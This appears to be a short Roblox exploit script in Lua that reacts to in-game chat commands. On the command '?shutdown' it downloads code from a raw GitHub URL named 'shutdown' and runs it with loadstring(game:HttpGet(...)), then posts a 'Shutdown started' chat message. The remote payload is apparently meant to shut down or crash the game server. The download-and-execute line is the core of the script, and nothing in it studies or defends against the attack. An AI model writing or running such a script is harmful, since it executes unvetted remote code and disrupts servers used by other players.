local player = game.Players.LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local starterGui = game:GetService("StarterGui")
local sayMessageRequest = replicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")

player.Chatted:Connect(function(message)
    if message == "?guns" then
        wait(1)
        sayMessageRequest:FireServer("?guns", "All")
    elseif message == "?shutdown" then
        local loadstringLink = "https://raw.githubusercontent.com/raisenscripts/Premiumv3/main/shutdown"
        loadstring(game:HttpGet(loadstringLink))()
        starterGui:SetCore("ChatMakeSystemMessage", {
            Text = "Shutdown started give me 1min",
            Color = Color3.fromRGB(0, 255, 0),
            Font = Enum.Font.SourceSans,
            TextSize = 18,
        })
    end
end)
